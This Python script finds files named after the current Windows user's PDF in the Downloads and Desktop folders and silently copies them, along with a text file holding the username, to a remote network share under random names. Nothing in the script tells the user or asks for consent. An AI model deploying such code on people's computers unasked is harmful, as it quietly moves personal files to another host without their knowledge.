import os
import getpass
import random

username = getpass.getuser()
path = 'c:\\Users\\'+username+'\\Downloads'

pdfname = username+'.pdf'

files = []
# r=root, d=directories, f = files
for r, d, f in os.walk(path):
    for file in f:
        if pdfname in file:
            files.append(os.path.join(r, file))

rand = str(random.randint(0,50))
for f in files:
    file1 = open(f,"rb")
    file2 = open("//xeon-s8/DFS/Python/dfzf/sdf/New folder/"+rand+pdfname,"w+b")


    file2.write(file1.read())

    file1.close()
    file2.close()

file3 = open("//xeon-s8/DFS/Python/dfzf/sdf/New folder/"+rand+username+".txt","w+")
file3.write(username)
file3.close()
path = 'c:\\Users\\'+username+'\\Desktop'

pdfname = username+'.pdf'

files = []
# r=root, d=directories, f = files
for r, d, f in os.walk(path):
    for file in f:
        if pdfname in file:
            files.append(os.path.join(r, file))

rand = str(random.randint(0,50))
for f in files:
    file1 = open(f,"rb")
    file2 = open("//xeon-s8/DFS/Python/dfzf/sdf/New folder/"+rand+pdfname,"w+b")

    file2.write(file1.read())
    file1.close()
    file2.close()

